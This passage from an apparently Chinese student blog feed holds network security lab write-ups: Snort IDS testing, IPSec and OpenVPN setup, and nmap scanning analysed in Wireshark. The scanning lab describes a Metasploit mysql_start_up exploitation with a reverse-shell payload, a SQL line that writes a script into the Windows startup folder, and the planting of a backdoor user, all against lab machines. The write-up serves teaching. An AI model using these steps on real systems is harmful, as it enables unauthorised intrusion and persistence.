  <div class="note info"><p>其中 proto 参数代表欲检测的协议，取值有 tcp udp icmp ip all，各参数间空格分开，这里写 all 就行。 Memcap 代表分配给端口扫描的最大字节数，数字越高，越多节点可以被跟踪。Sense_level 用于检测端口扫描的敏感度水平。取值有 low medium high 三种。low 级别使用通用方法来查找响应错误，medium 会检测端口扫描和过滤端口扫描（那些没有收到响应的端口扫描），high 级别有最小的端口检测限制。这里设为了 high。除此以外，还有 scan_type、logfile、watchip、ignore_scanners 配置项，对于本实验的需求不大。</p>
</div>
</li>
</ul>
<ol>
<li>
<p>在一台攻击机上启动 nmap 进行扫描。同时在目标机上启动 snort。 <img data-src="/2019/11/25/experiments/security/web/ids/19.png" class=""> <img data-src="/2019/11/25/experiments/security/web/ids/20.png" class=""> <img data-src="/2019/11/25/experiments/security/web/ids/21.png" class=""> <img data-src="/2019/11/25/experiments/security/web/ids/22.png" class=""></p>
</li>
<li>
<p>结果只检测出了上述三个有效信息，没有像预期那样检测到扫描工具扫描的痕迹。</p>
 <div class="note warning"><p>预期可能会检测出类似于 SCAN UPnP service discover attempt 这样的信息，可能是规则配置不力（忘记取消注释或者规则语句错误），或者是扫描行为不匹配当前本地已启用规则所致？</p>
</div>
</li>
</ol>
<h2 id="总结">总结</h2>
<p>通过几个小的 snort 配置实验，我对基于 snort 的入侵检测有了初步的了解，学习书写了几个简单的 snort 规则并测试其应用过后报警的效果。这个输出格式一般为：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">[**] [1:sid:rev] "msg" [**]</span><br><span class="line">[Classfication] [Priority:&lt;priority&gt;]</span><br><span class="line">[time] [from[ip:port]-&gt;dest[ip:port]]</span><br><span class="line">[protocol] [ttl] [tos] [id] [iplen] [dgmlen] [flags]</span><br><span class="line">[各协议包额外信息]</span><br></pre></td></tr></tbody></table></figure>
<h2 id="补充">补充</h2>
<p>重新使用其他扫描工具完成端口扫描实验，发现可以成功检测。说明上述检测不成功的原因应该是扫描动作与预期规则不匹配。我使用了 Nessus 3 版本完成了这一部分的实验。 <img data-src="/2019/11/25/experiments/security/web/ids/24.png" class=""></p>
<ol>
<li>
<p>同时开启被扫描端的 snort，发现除了有尝试执行 shellcode 以外 (这个原来用 nmap 扫的时候也扫到了) 还发出了 SCAN 的警告，分类信息显示为 Attempted information leak（尝试泄露信息），基本可以确认 nessus 发出的扫描被我们检测出来了。 <img data-src="/2019/11/25/experiments/security/web/ids/25.png" class=""> <img data-src="/2019/11/25/experiments/security/web/ids/26.png" class=""></p>
</li>
<li>
<p>此扫描还尝试利用 NETBIOS 登录来取得用户权限，以获取后续漏洞信息。 <img data-src="/2019/11/25/experiments/security/web/ids/27.png" class=""></p>
</li>
</ol>
]]></content>
      <categories>
        <category>实验</category>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络空间安全</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>虚拟专用网实验</title>
    <url>/2019/12/05/experiments/security/web/vpn/</url>
    <content><![CDATA[<h2 id="目标">目标</h2>
<p>了解什么是虚拟专用网（VPN），知道 VPN 的原理和应用。通过实验理解 IPSec 和 VPN 的关系和必要性。</p>
<span id="more"></span>
<div class="note danger"><p>本篇文章为实验记录，仅供交流学习使用，切勿违法应用，所有文中提到的工具不提供下载。</p>
</div>
<h2 id="原理">原理</h2>
<h3 id="虚拟专用网-VPN-1">虚拟专用网 (VPN)[^1]</h3>
<p>虚拟专用网（Virtual Private Network，VPN）是利用 Internet 等公共网络的基础设施，通过隧道技术，为用户提供的与专用网络具有相同通信功能的安全数据通道。“虚拟” 是指用户无需建立各自专用的物理线路，而利用 Internet 等公共网络资源和设备建立一条逻辑上的专用数据通道，并实现与专用数据通道相同的通信功能。“专用网络” 是指虚拟出来的网络并非任何连接在公共网络上的用户都能使用，只有经过授权的用户才可使用。</p>
<p>该通道内传输数据经过加密和认证，可保证传输内容的完整性和机密性。</p>
<h3 id="IPSec">IPSec</h3>
<p>互联网安全协议（英语：Internet Protocol Security，缩写为 IPsec），是一个协议包，通过对 IP 协议的分组进行加密和认证来保护 IP 协议的网络传输协议族（一些相互关联的协议的集合）。由认证头（AH）、封装安全载荷（ESP）、安全关联（SA）组成。</p>
<p>IPSec 被设计用来提供入口之间和端到端之间的通信安全，无论哪一种模式都可以用来构建虚拟专用网（VPN）。</p>
<h2 id="步骤和关键技术">步骤和关键技术</h2>
<h3 id="IPSec协议配置">IPSec 协议配置</h3>
<div class="note info"><p>Windows XP 端的 IP 为 192.168.235.136，Windows 2000 端的 IP 为 192.168.235.141</p>
</div>
<ol>
<li>
<p>在 WindowsXP 下打开 “控制面板→管理工具→本地安全策略”，找到 “IP 安全策略，在本地计算机”。双击进入。然后右击 “安全服务器”，点击指派规则。<img data-src="/2019/12/05/experiments/security/web/vpn/1.png" class=""> <img data-src="/2019/12/05/experiments/security/web/vpn/2.png" class=""></p>
</li>
<li>
<p>双击 “安全服务器” 进入其设置，双击 “所有 ICMP 通讯量” 进入规则设置。<img data-src="/2019/12/05/experiments/security/web/vpn/3.png" class=""></p>
</li>
<li>
<p>在 “筛选器操作” 选项卡中，选择 “需要安全”。<img data-src="/2019/12/05/experiments/security/web/vpn/4.png" class=""></p>
</li>
<li>
<p>在 “身份验证方法” 选项卡中，添加一个共享密钥。记住此密钥，在另一端要做同样的设置。 <img data-src="/2019/12/05/experiments/security/web/vpn/5.png" class="" title="身份验证方法选项卡"></p>
 <div class="tabs" id="key"><ul class="nav-tabs"><li class="tab active"><a href="#key-1">XP 端</a></li><li class="tab"><a href="#key-2">2000 端</a></li></ul><div class="tab-content"><div class="tab-pane active" id="key-1"><img data-src="/2019/12/05/experiments/security/web/vpn/6.png" class="" title="设置共享密钥"></div><div class="tab-pane" id="key-2"><img data-src="/2019/12/05/experiments/security/web/vpn/7.png" class="" title="设置共享密钥"></div></div></div>
</li>
<li>
<p>只在一端配置时，ping 端会直接显示 Request timed out。双端配置时，会显示 Negotiating IP Security。正确配置时，会先显示 Negotiating IP Security，然后才会显示 ping 的 reply，代表双端成功建立了连接。可以在 win2000 端的 IP 安全监视器中看到连过来的 xp 设备。</p>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/12/05/experiments/security/web/vpn/8.png" class="" title="只配置了一边"></div><div class="group-picture-column"><img data-src="/2019/12/05/experiments/security/web/vpn/9.png" class="" title="双端配置"></div><div class="group-picture-column"><img data-src="/2019/12/05/experiments/security/web/vpn/10.png" class="" title="完全正确的配置"></div></div></div> 
 <img data-src="/2019/12/05/experiments/security/web/vpn/11.png" class="" title="查看链接的Windows XP设备">
 <div class="note info"><p>当然，也可以配置专用的 IPSec 安全策略，不使用系统默认值。过程类似，不再赘述。</p>
</div>
</li>
</ol>
<h3 id="OpenVPN配置">OpenVPN 配置</h3>
<div class="note info"><p>本部分实验使用 WindowsXP 和 Windows2000 共同完成，WindowsXP 充当服务端，Windows2000 充当客户端。</p>
</div>
<div class="note warning"><p>事先下载安装好 openssl 库，否则会报 “命令不存在” 的错误。</p>
</div>
<ol>
<li>
<p>首先安装 OpenVPN。安装过程一路下一步即可。</p>
</li>
<li>
<p>将安装目录 easy-rsa 下 <code>vars.bat.sample</code> 文件换成自己的信息，然后更名为 <code>vars.bat</code>。</p>
 <figure class="highlight shell"><figcaption><span>vars.bat</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line">...</span><br><span class="line">set &lt;KEY&gt;=&lt;VALUE&gt;</span><br></pre></td></tr></tbody></table></figure>
 <img data-src="/2019/12/05/experiments/security/web/vpn/12.png" class="">
</li>
<li>
<p>将 <code>openssl.cnf.sample</code> 更名为 <code>openssl.cnf</code>。 <img data-src="/2019/12/05/experiments/security/web/vpn/13.png" class=""></p>
</li>
<li>
<p>在 easy-rsa 文件夹下，先后运行 <code>vars</code> 和 <code>clean-all.bat</code> 命令，以进行初始化。 <img data-src="/2019/12/05/experiments/security/web/vpn/14.png" class=""></p>
</li>
<li>
<p>生成 CA 根证书。 <img data-src="/2019/12/05/experiments/security/web/vpn/15.png" class=""></p>
</li>
<li>
<p>生成密钥交换协议算法参数。 <img data-src="/2019/12/05/experiments/security/web/vpn/16.png" class=""></p>
</li>
<li>
<p>生成服务端和客户端证书并签发十年有效期。</p>
 <div class="tabs" id="certificate"><ul class="nav-tabs"><li class="tab active"><a href="#certificate-1">server</a></li><li class="tab"><a href="#certificate-2">client</a></li></ul><div class="tab-content"><div class="tab-pane active" id="certificate-1"><figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">build-server-key.bat server</span><br></pre></td></tr></tbody></table></figure>
<p><img data-src="/2019/12/05/experiments/security/web/vpn/17-1.png" class=""> <img data-src="/2019/12/05/experiments/security/web/vpn/17-2.png" class=""></p></div><div class="tab-pane" id="certificate-2"><figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">build-key.bat client</span><br></pre></td></tr></tbody></table></figure>
<p><img data-src="/2019/12/05/experiments/security/web/vpn/18-1.png" class=""> <img data-src="/2019/12/05/experiments/security/web/vpn/18-2.png" class=""></p></div></div></div>
</li>
<li>
<p>生成 ta key</p>
</li>
</ol>
]]></content>
      <categories>
        <category>实验</category>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络空间安全</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>网络扫描</title>
    <url>/2019/11/09/experiments/security/web/webscan/</url>
    <content><![CDATA[<h2 id="目标">目标</h2>
<p>了解网络扫描的原理和应用，使用 xscan、nmap 或 nessus 其中的任意一种常见的扫描软件对某主机进行端口、服务、漏洞扫描，分析数据包交互过程。</p>
<span id="more"></span>
<div class="note danger"><p>本篇文章为实验记录，仅供交流学习使用，切勿违法应用，所有文中提到的工具不提供下载。</p>
</div>
<h2 id="原理">原理</h2>
<h3 id="扫描">扫描</h3>
<p>网络扫描是确认网络运行的主机的工作程序，或是为了对主机进行攻击，或是为了网络安全评估。网络扫描程序，如 Ping 扫射和端口扫描，返回关于哪个 IP 地址映射有主机连接到因特网上的并是工作的，这些主机提供什么样的服务的信息。另一种扫描方法是反向映射，返回关于哪个 IP 地址上没有映射出活动的主机的信息，这使攻击者能假设出可行的地址。网络漏洞扫描器是网络入侵者收集信息的重要手段，主要用于扫描目标主机识别其工作状态（开 / 关机）、识别目标主机端口的状态（监听 / 关闭）、识别目标主机系统及服务程序的类型和版本、根据已知漏洞信息，分析系统脆弱点、生成扫描结果报告。</p>
<h3 id="主机扫描">主机扫描</h3>
<p>主机扫描的目的是确定在目标网络上的主机是否可达。这是信息收集的初级阶段，其效果直接影响到后续的扫描。常见扫描手段有 ICMP Echo 扫描、ICMP Sweep 扫描、Broadcast ICMP 扫描、Non-Echo ICMP 扫描等。防火墙和网络过滤设备常常导致传统的探测手段变得无效。为了突破这种限制，必须采用一些非常规的手段，利用 ICMP 协议提供网络间传送错误信息的手段，往往可以更有效的达到目的。</p>
<h3 id="端口扫描">端口扫描</h3>
<p>确定目标主机可达后，使用端口扫描技术，发现目标主机的开放端口，包括网络协议和各种应用监听的端口。有开放扫描、隐蔽扫描、半开放扫描三种方式。</p>
<h3 id="操作系统识别">操作系统识别</h3>
<p>根据各个 OS 在 TCP/IP 协议栈实现上的不同特点，采用黑盒测试方法，通过研究其对各种探测的响应形成识别指纹，进而识别目标主机运行的操作系统。根据采集指纹信息的方式，又可以分为主动扫描和被动扫描两种方式。</p>
<h3 id="漏洞扫描">漏洞扫描</h3>
<p>在端口扫描后得知目标主机开启的端口以及端口上的网络服务，将这些相关信息与网络漏洞扫描系统提供的漏洞库进行匹配，查看是否有满足匹配条件的漏洞存在。通过模拟黑客的攻击手法，对目标主机系统进行攻击性的安全漏洞扫描，如测试弱势口令等。若模拟攻击成功，则表明目标主机系统存在安全漏洞。</p>
<h2 id="步骤和关键技术">步骤和关键技术</h2>
<h3 id="主机、服务和端口扫描">主机、服务和端口扫描</h3>
<div class="note info"><p>本次使用的扫描工具为 nmap6.49<br>
<img data-src="/2019/11/09/experiments/security/web/webscan/0.png" class=""></p>
</div>
<p>对目标机所在地址及地址段进行了 Regular scan、Ping scan、Intense scan 三种扫描。</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/09/experiments/security/web/webscan/1.png" class="" title="Regular scan"></div><div class="group-picture-column"><img data-src="/2019/11/09/experiments/security/web/webscan/2.png" class="" title="Ping scan"></div><div class="group-picture-column"><img data-src="/2019/11/09/experiments/security/web/webscan/3.png" class="" title="Intense scan"></div></div></div>
<p>另外尝试了 Maimon 扫描（下图）。扫描结果见 “数据与分析” 部分。 <img data-src="/2019/11/09/experiments/security/web/webscan/4.png" class="" title="Maimon"></p>
<div class="note info"><p>本部分 3.1 实验中，探测机 IP 为 192.168.235.136，运行 Windows XP 系统。被探测机 IP 为 192.168.235.138，运行 Windows Server 2012 系统。</p>
</div>
<h3 id="漏洞扫描-2">漏洞扫描</h3>
<p>本部分实验使用了 Kali Linux 自带的 metasploit 工具，它是一个开源的安全漏洞检测工具，可以帮助安全和 IT 专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动的安全性进行评估，提供真正的安全风险情报。</p>
<div class="note info"><p>本部分使用的扫描机 IP 为 192.168.235.132，运行 Kali Linux；被扫描机 IP 为 192.168.235.136，运行 Windows XP 系统。</p>
</div>
<img data-src="/2019/11/09/experiments/security/web/webscan/6.png" class="" title="metasploit主界面">
<ol>
<li>
<p>打开 metasploit 主界面，输入 <code>show exploits</code> 查看所有漏洞的列表 <img data-src="/2019/11/09/experiments/security/web/webscan/7.png" class=""></p>
<ul>
<li>按照字母顺序，列表从左到右分别是漏洞名称、披露日期、可利用性、描述，其中漏洞的命名格式是 "平台 / 类型 / 具体应用简称"。由于我的 Kali 版本并不是最新的，所以披露日期可能比较偏早（与此同时，msf 的最新版本已经是 5.0 了）。</li>
</ul>
</li>
<li>
<p>本次实验中，选择 <code>mysql_start_up</code> 漏洞进行复现。 <img data-src="/2019/11/09/experiments/security/web/webscan/8.png" class=""></p>
 <div class="note info"><h4 id="mysql-start-up启动项提权">mysql_start_up 启动项提权</h4>
<p>在数据库中添加一个表格，将 <code>vbs</code> 或 <code>bat</code> 代码写入表中，内有 <code>net user</code> 创建后门用户指令，然后运行以下语句</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> \ <span class="keyword">from</span> a <span class="keyword">into</span> outfile "%startup%\\a.vbs";</span><br></pre></td></tr></tbody></table></figure> 导出脚本，并添加到系统启动项 [^1]。</div>
</li>
<li>
<p>msf 下 <code>mysql_start_up</code> 提权只需要知道一组数据库用户名和密码，但有一定的成功几率，需要多试几次，对英文版系统支持较好。</p>
<ul>
<li>命令行下输入 <code>use &lt;漏洞全名&gt;</code>，进入漏洞利用模式。<code>show targets</code> 的结果代表了 Windows 上的 MySQL 可能会被利用。 <img data-src="/2019/11/09/experiments/security/web/webscan/9.png" class=""></li>
</ul>
</li>
<li>
<p><code>show payloads</code> 可以查看所有载荷列表，载荷（payloads）是一串代码中主要的操作部分，在漏洞利用中充当主要的位置。 <img data-src="/2019/11/09/experiments/security/web/webscan/10.png" class="" title="可用载荷列表"></p>
 <div class="tabs" id="payloads"><ul class="nav-tabs"><li class="tab active"><a href="#payloads-1"><code>generic/shell_reverse_tcp</code> 利用方法</a></li><li class="tab"><a href="#payloads-2"><code>windows/messagebox</code> 利用方法</a></li></ul><div class="tab-content"><div class="tab-pane active" id="payloads-1"><pre><code>&lt;img src="/2019/11/09/experiments/security/web/webscan/11.png" class=""&gt;
set payload "payload_name"可以设定使用的payload，show options可以查看该payload利用到的所有参数，我们所要做的是将所有required部分填上我们需要的值。
&lt;div class="group-picture"&gt;&lt;div class="group-picture-row"&gt;&lt;div class="group-picture-column"&gt;&lt;img src="/2019/11/09/experiments/security/web/webscan/12.png" class=""&gt;&lt;/div&gt;&lt;div class="group-picture-column"&gt;&lt;img src="/2019/11/09/experiments/security/web/webscan/13.png" class=""&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;
设置完成后，使用`exploit`命令开始利用漏洞。

&lt;div class="note success no-icon"&gt;&lt;p&gt;从输出上来看，目标机上已经被传送了一个后门文件&lt;code&gt;wKpyl.exe&lt;/code&gt;，它需要我们手动清除。&lt;br&gt;
</code></pre>
<p><img data-src="/2019/11/09/experiments/security/web/webscan/14.png" class=""> <img data-src="/2019/11/09/experiments/security/web/webscan/15.png" class=""><br><br>
目标机的相应位置上确实被置入了一个这样的后门程序。</p><p></p>
<ul>
<li>由于漏洞披露已经有了一段时间，当我拖到宿主机准备分析时，杀毒软件报毒（这说明漏洞库已经收录了漏洞相关信息），其类型为后门病毒。这个可执行文件的部分属性如下。<br>
<img data-src="/2019/11/09/experiments/security/web/webscan/16.png" class=""> <img data-src="/2019/11/09/experiments/security/web/webscan/17.png" class="">
<ul>
<li>由于这是开机启动型后门，所以需要重新启动 server 才会奏效。</li>
</ul>
</li>
</ul>
</div></div><div class="tab-pane" id="payloads-2"><pre><code>&lt;details class="note info"&gt;&lt;summary&gt;&lt;p&gt;总结&lt;/p&gt;
</code></pre>

<p>顾名思义，就是弹个框，告诉用户 “你被攻击了”。算是一个能 “看得见” 的有效漏洞利用。</p>

	和（1）类似，首先 set payload，然后 show options。观察参数，发现 “可视化” 的部分在于 <code>text</code> 和 <code>title</code>，我们决定给它加一点特效（笑）。
	<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/09/experiments/security/web/webscan/18.png" class=""></div><div class="group-picture-column"><img data-src="/2019/11/09/experiments/security/web/webscan/19.png" class=""></div></div></div>
<pre><code>&lt;img src="/2019/11/09/experiments/security/web/webscan/20.png" class="" title="exploit!"&gt;
输入&lt;code&gt;exploit&lt;/code&gt;开始利用。观察输出，发现它也是向目标输出了一个&lt;code&gt;exe&lt;/code&gt;可执行文件，放入了启动项中。
&lt;img src="/2019/11/09/experiments/security/web/webscan/21.png" class=""&gt;

重启Win Server后，系统弹出了这个MessageBox，证明上述漏洞被有效利用且能成功执行payload程序。 &lt;img src="/2019/11/09/experiments/security/web/webscan/22.png" class=""&gt;
</code></pre></div></div>
</li>
</ol>
<h2 id="数据和分析">数据和分析</h2>
<p>下面以 Wireshark 抓包的角度来分析本次实验的数据交互情况。</p>
<div class="note info"><p>目标主机情况如下</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/09/experiments/security/web/webscan/true-info.png" class="" title="目标机网络配置"></div><div class="group-picture-column"><img data-src="/2019/11/09/experiments/security/web/webscan/true-info2.png" class="" title="目标机网络配置2"></div></div><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/09/experiments/security/web/webscan/true-mac.png" class="" title="目标机MAC地址"></div></div><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/09/experiments/security/web/webscan/true-php.png" class="" title="目标机php版本"></div></div></div></div>
<h3 id="基本信息扫描">基本信息扫描</h3>
<div class="tabs" id="basic_scan"><ul class="nav-tabs"><li class="tab active"><a href="#basic_scan-1">Regular Scan 扫描</a></li><li class="tab"><a href="#basic_scan-2">Ping Scan 扫描</a></li><li class="tab"><a href="#basic_scan-3">Intense Scan 扫描</a></li><li class="tab"><a href="#basic_scan-4">Maimon 扫描</a></li></ul><div class="tab-content"><div class="tab-pane active" id="basic_scan-1"><p>从下图可以看到，这是一个典型的 TCP SYN 扫描，是半开放扫描。<br>
<img data-src="/2019/11/09/experiments/security/web/webscan/23.png" class=""><br>
<img data-src="/2019/11/09/experiments/security/web/webscan/24.png" class=""><br>
扫描机不断向目标机不同端口发送 SYN 包，请求一次连接，而在目标机回复 SYN+ACK 时，自己发送一个 RST 包停止连接。SYN+ACK 的回复代表目标机的端口正处于监听状态，可以代表端口的开启情况。</p>
<p>目标机的 80 端口和 8080 端口处于监听状态，是开启的。</p>
<p>Regular Scan 的输出：</p>
<figure class="highlight text"><table><tbody><tr><td class="code"><pre><span class="line">Nmap scan report for 192.168.235.138</span><br><span class="line">Host is up (0.0022s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">80/tcp   open  http</span><br><span class="line">8080/tcp open  http-proxy</span><br><span class="line">MAC Address: 00:0C:29:18:BE:BF (VMware)</span><br></pre></td></tr></tbody></table></figure>
<p>基本上都是对的。</p></div><div class="tab-pane" id="basic_scan-2"><p>我用 ping scan 扫描了 <code>192.168.1.0/24</code> 整个网段，可以看到密集的 ICMP 请求，是在做 ping 操作。<br>
<img data-src="/2019/11/09/experiments/security/web/webscan/28.png" class=""><br>
<img data-src="/2019/11/09/experiments/security/web/webscan/29.png" class=""></p>
<p>短时间内同时向多个 IP 地址发送了 type13 的 ICMP timestamp request 请求，这是一种 Non-Echo 的 ICMP 扫描。</p>
<p>针对每一个地址，它经历了以下过程</p>
<ol>
<li>扫描机向目标主机发送了 ICMP Echo Request (type 8) 数据包，等待回复的 ICMP Echo Reply 包 (type 0)，这是 ICMP Echo 的扫描技术。 <img data-src="/2019/11/09/experiments/security/web/webscan/30.png" class=""></li>
<li>Echo Request 是同时向多个主机做出的并行扫描动作，因此，也用到了 ICMP Sweep 扫描。 <img data-src="/2019/11/09/experiments/security/web/webscan/31.png" class=""> <img data-src="/2019/11/09/experiments/security/web/webscan/32.png" class=""></li>
<li>但是，扫描结果并不太准确，192.168.235.138 虽然是在线主机，但是可能是上一次扫描遗留下来的结果。我只扫描了 192.168.1.0 的地址段。 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/09/experiments/security/web/webscan/res2-1.png" class=""></div><div class="group-picture-column"><img data-src="/2019/11/09/experiments/security/web/webscan/res2-2.png" class=""></div></div></div>
</li>
</ol></div><div class="tab-pane" id="basic_scan-3"><ol>
<li>
<p>先进行端口的探测，使用 SYN 扫描。 <img data-src="/2019/11/09/experiments/security/web/webscan/33.png" class=""> <img data-src="/2019/11/09/experiments/security/web/webscan/34.png" class=""> <img data-src="/2019/11/09/experiments/security/web/webscan/35.png" class=""> 与可联通的端口建立握手连接，预备后续探测。</p>
</li>
<li>
<p>通过 HTTP 协议访问根目录，Server 响应暴露目标机的服务类型。 <img data-src="/2019/11/09/experiments/security/web/webscan/36.png" class=""></p>
</li>
<li>
<p>通过 OPTIONS 请求，探求目标机的支持服务类型，紧接着目标机向其 DNS 服务器发动了一次向 www.360se.net 的解析请求。 <img data-src="/2019/11/09/experiments/security/web/webscan/37.png" class=""> <img data-src="/2019/11/09/experiments/security/web/webscan/38.png" class=""></p>
</li>
<li>
<p>在整个扫描期间，可以发现目标机不停地在向 <code>133.130.101.150</code> 这个 IP 发送带有 SYN、ECN、CWR 标志的 TCP 包。</p>
</li>
<li>
<p>故意请求一个可能并不存在的地址，或构造不合法的请求方式，从返回错误中也可以暴露服务器所开设的服务信息。就算是 404 Not Found，返回头中也可能携带服务信息。 <img data-src="/2019/11/09/experiments/security/web/webscan/39.png" class=""> <img data-src="/2019/11/09/experiments/security/web/webscan/40.png" class=""> <img data-src="/2019/11/09/experiments/security/web/webscan/41.png" class=""> <img data-src="/2019/11/09/experiments/security/web/webscan/42.png" class=""> <img data-src="/2019/11/09/experiments/security/web/webscan/43.png" class=""></p>
</li>
<li>
<p>使用一个已存在的网页进行验证，扫描结束。 <img data-src="/2019/11/09/experiments/security/web/webscan/44.png" class=""></p>
</li>
<li>
<p>另外，观察每次发送带有 <code>PSH|FIN</code> 标记的请求时，目标机回复的应答包中，确认序列号为攻击者序列数 + 1，可以从这里提取出目标机操作系统为 Windows，这是 ACK 扫描 —— 一种检测目标主机操作系统的方法。<img data-src="/2019/11/09/experiments/security/web/webscan/45.png" class=""></p>
</li>
<li>
<p>以下是扫描结果</p>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/09/experiments/security/web/webscan/res3-1.png" class="" title="端口和主机情况"></div><div class="group-picture-column"><img data-src="/2019/11/09/experiments/security/web/webscan/res3-2.png" class="" title="其他基本信息"></div></div></div>
</li>
</ol>
<img data-src="/2019/11/09/experiments/security/web/webscan/res3-3.png" class=""></div><div class="tab-pane" id="basic_scan-4"><ol>
<li>首先上扫描结果。可以看到扫描结果基本正确，操作系统也比较准确。 <img data-src="/2019/11/09/experiments/security/web/webscan/46.png" class=""> <img data-src="/2019/11/09/experiments/security/web/webscan/47.png" class=""></li>
<li>它比 Intense 扫描多扫出了一个 3306 端口，它是怎么发现的呢？ <div class="note primary"><p>在 SYN 扫描时，它就发现了 3306 号端口（3306 号端口给它发送了 SYN+ACK），再一连接，Server 就会回复 Server Greeting，从而发现了 3306 号端口的存在，版本号也随 Server Greeting 的发出而同时泄露。<br>
</p></div></li>
</ol>
<p><img data-src="/2019/11/09/experiments/security/web/webscan/48.png" class=""> <img data-src="/2019/11/09/experiments/security/web/webscan/49.png" class=""></p><p></p>
</div>
<ol start="3">
<li>预先的扫描是和（3）中一样的 SYN 方法。Maimon 还会进行重试。 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/09/experiments/security/web/webscan/50.png" class="" title="发送多个SYN包"></div><div class="group-picture-column"><img data-src="/2019/11/09/experiments/security/web/webscan/51.png" class="" title="发动重试"></div></div></div>
</li>
<li>但在端口扫描前，maimon 会先发送 FIN+ACK 请求关闭连接，这样做的目的可能是重置状态，减少干扰。 <img data-src="/2019/11/09/experiments/security/web/webscan/53.png" class=""></li>
<li>扫描期间，还可以看到目标机的 TLS 通信过程。含义推测是要进行 443 号端口相关的验证，需要用到这些协议。<br>
<img data-src="/2019/11/09/experiments/security/web/webscan/52.png" class=""> <img data-src="/2019/11/09/experiments/security/web/webscan/55.png" class=""> <img data-src="/2019/11/09/experiments/security/web/webscan/54.png" class=""> <div class="note info"><p>这里应该是在进行操作系统指纹的探查，依据是带有 PSH 标志的 ACK 包，不过负责这里验证的 IP 不再是探测机的 IP！</p>
</div></li>
</ol>
</div> 
<pre><code>做完这些检测后，被扫描机发送RST+ACK关闭连接，接下来做服务检测。验证方法与（3）类似，不再赘述。 &lt;img src="/2019/11/09/experiments/security/web/webscan/56.png" class=""&gt;
</code></pre></div>
<h3 id="漏洞扫描及利用">漏洞扫描及利用</h3>
<ol>
<li>首先利用已知的一组用户名密码登录 MySQL 服务器。 <img data-src="/2019/11/09/experiments/security/web/webscan/57.png" class=""></li>
<li>向表中插入二进制数据，在传之前还做了一些事情。 <img data-src="/2019/11/09/experiments/security/web/webscan/58.png" class="" title="应该是很长的sql语句的拆分"></li>
<li>查询服务器的操作系统。 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/09/experiments/security/web/webscan/59.png" class="" title="询问"></div><div class="group-picture-column"><img data-src="/2019/11/09/experiments/security/web/webscan/60.png" class="" title="响应回答"></div></div></div></li>
<li>查询操作系统临时表目录。 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/09/experiments/security/web/webscan/61.png" class="" title="询问"></div><div class="group-picture-column"><img data-src="/2019/11/09/experiments/security/web/webscan/62.png" class="" title="响应回答"></div></div></div></li>
<li><code>select xxx info dumpfile</code> 是最关键的一步。漏洞利用关键点。由于相关防护不到位，服务器接受了这个请求，把二进制数据导出了文件，并添加到了启动项文件夹中。做完这个操作后，攻击机就发送 FIN+ACK 与服务器断开了链接。<img data-src="/2019/11/09/experiments/security/web/webscan/63.png" class=""> <div class="note info no-icon"><p>弹框时的数据交互情况类似。</p>
</div>
</li>
</ol>
<h2 id="收获">收获</h2>
<p>通过使用扫描软件对于某主机进行扫描，再进行抓包分析，直观的看到了主机扫描数据交互的过程，理解了网络扫描的基本原理和不同扫描方法的特点。使用 metasploit 尝试了漏洞的利用，体验了漏洞的表现和侵入性。</p>
<h2 id="补充">补充</h2>
<ol>
<li>
<p>做完 “漏洞扫描” 实验的 metasploit 部分后，我才发现 metasploit 是漏洞利用软件而非漏洞扫描软件。重新上网查找相关资料，发现存在扫描漏洞的 nmap 脚本 <a href="https://github.com/vulnersCom/nmap-vulners">nmap-vulners</a>，决定使用这个脚本重新完成本部分实验和分析。</p>
</li>
<li>
<p>使用 <code>-script</code> 选项指定 <code>nse</code> 脚本位置。扫描几乎如同普通扫描，也扫出了三个开放端口。</p>
 <img data-src="/2019/11/09/experiments/security/web/webscan/ex0.png" class=""> <img data-src="/2019/11/09/experiments/security/web/webscan/ex1.png" class=""> <img data-src="/2019/11/09/experiments/security/web/webscan/ex2.png" class="">
</li>
<li>
<p>但是没有看到漏洞相关的信息输出。我换用 kali linux 重新进行扫描，得到了以下结果 <img data-src="/2019/11/09/experiments/security/web/webscan/ex3.png" class=""></p>
</li>
<li>
<p>以上结果表明系统确实存在了很多 cve 漏洞，甚至还有 2019 年的新漏洞，随便打开一个网页看看：<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-0211">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-0211</a> （nmap 给的页面链接过不了验证码）</p>
 <blockquote class="blockquote-center">
<p>CVE-2019-0211 是一种特权升级漏洞，在 Apache HTTP Server 2.4 版本 2.4.17 至 2.4.38 中，使用 MPM 事件，工作者或 prefork，在权限较低的子进程或线程（包括进程内脚本解释器执行的脚本）中执行的代码可以执行任意代码通过操纵记分板，父进程（通常是 root）的权限。非 Unix 系统不受影响。</p>

</blockquote>
 <div class="note default"><p>按说这个漏洞对于 Win Server 来说没影响，如果检测了目标操作系统的话，这个漏洞的重要性可能就会下降了。</p>
</div>
</li>
<li>
